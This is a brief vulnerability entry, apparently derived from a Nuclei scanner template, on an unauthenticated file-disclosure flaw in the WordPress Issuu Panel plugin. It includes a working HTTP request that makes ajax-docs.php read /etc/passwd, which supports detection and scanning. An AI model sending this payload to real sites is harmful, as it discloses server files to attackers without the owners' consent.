# Vulnerability: Wordpress Plugin Issuu Panel Remote/Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`issuu-panel-lfi.yaml`)

## Description
The WordPress Issuu Plugin includes an arbitrary file disclosure vulnerability that allows unauthenticated attackers to disclose the content of local and remote files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/issuu-panel/menu/documento/requests/ajax-docs.php?abspath=%2Fetc%2Fpasswd
```

